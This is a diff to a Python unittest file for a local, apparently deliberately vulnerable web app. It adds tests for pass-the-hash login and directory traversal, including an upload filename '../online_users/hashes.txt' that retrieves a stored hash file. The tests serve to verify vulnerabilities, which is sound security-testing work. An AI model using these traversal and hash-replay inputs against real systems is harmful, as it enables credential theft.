@@ -6,16 +6,52 @@ import base64
 import requests as rq
 
 
-
 def get_random_user():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+
+
+def get_user(username, password):
+    obj = {
+        'username': username,
+        'password': base64.b64encode(bytes(password, 'utf-8')).decode('ascii'),
+        'email': username + '@' + username + '.de',
+        'login': 'signup'
+    }
+    req = rq.post('http://localhost:6597/login', data=obj)
+    return req.history[0].cookies.get('sessionID')
+
+
+def send_file_appointment(filename):
+    user = get_random_user()
+    session_id = get_user(user, user)
+    data = {
+        'prename': 'Paul',
+        'lastname': 'Meyer',
+        'date': '2021-05-06',
+        'time': '02:56'
+    }
+    cookies = {
+        'sessionID': session_id,
+        'username': user
+    }
+    file = open('test_ids.txt', 'rb')
+    files = {'id_image': (filename, file, 'application/octet-stream')}
+    # req = rq.Request('POST', 'http://localhost:6597/make_appointment', data=data, files=files, cookies=cookies).prepare()
+    # print(req.body.decode('ascii'))
+    req = rq.post('http://localhost:6597/make_appointment', data=data, files=files, cookies=cookies)
+    file.close()
+    url = req.text[req.text.find('/get_id'):]
+    url = url[:url.find('"')]
+    url = 'http://localhost:6597' + url
+    return url, cookies
 
 
 class TestPassTheHashVuln(unittest.TestCase):
     def test_pth(self):
         obj = {
             'username': 'HNYDUW0MHB',
-            'password': base64.b64encode(bytes.fromhex('3B89BCF90E89EDCDED3A5A2C9EF09B42E4DC8C6546684673D94075C54F31B6B4')).decode('ascii'),
+            'password': base64.b64encode(
+                bytes.fromhex('3B89BCF90E89EDCDED3A5A2C9EF09B42E4DC8C6546684673D94075C54F31B6B4')).decode('ascii'),
             'login': 'signin'
         }
         req = rq.post('http://localhost:6597/login', data=obj)
@@ -29,6 +65,22 @@ class TestPassTheHashVuln(unittest.TestCase):
         }
         req = rq.post('http://localhost:6597/login', data=obj)
         self.assertEqual(401, req.status_code)
+
+
+class TestDirectoryTraversal(unittest.TestCase):
+    def test_get_own_id(self):
+        filename = 'test_ids.txt'
+        url, cookies = send_file_appointment(filename)
+
+        download = rq.get(url, allow_redirects=True, cookies=cookies)
+        self.assertEqual(download.content.decode('ascii'), 'tesfile')
+
+    def test_get_hashes(self):
+        filename = '../online_users/hashes.txt'
+        url, cookies = send_file_appointment(filename)
+
+        download = rq.get(url, allow_redirects=True, cookies=cookies)
+        self.assertEqual(download.content.decode('ascii'), 'secret hashes stored')
 
 
 class TestSimpleLogin(unittest.TestCase):
@@ -76,4 +128,3 @@ class TestSimpleLogin(unittest.TestCase):
 
 if __name__ == '__main__':
     unittest.main()
-
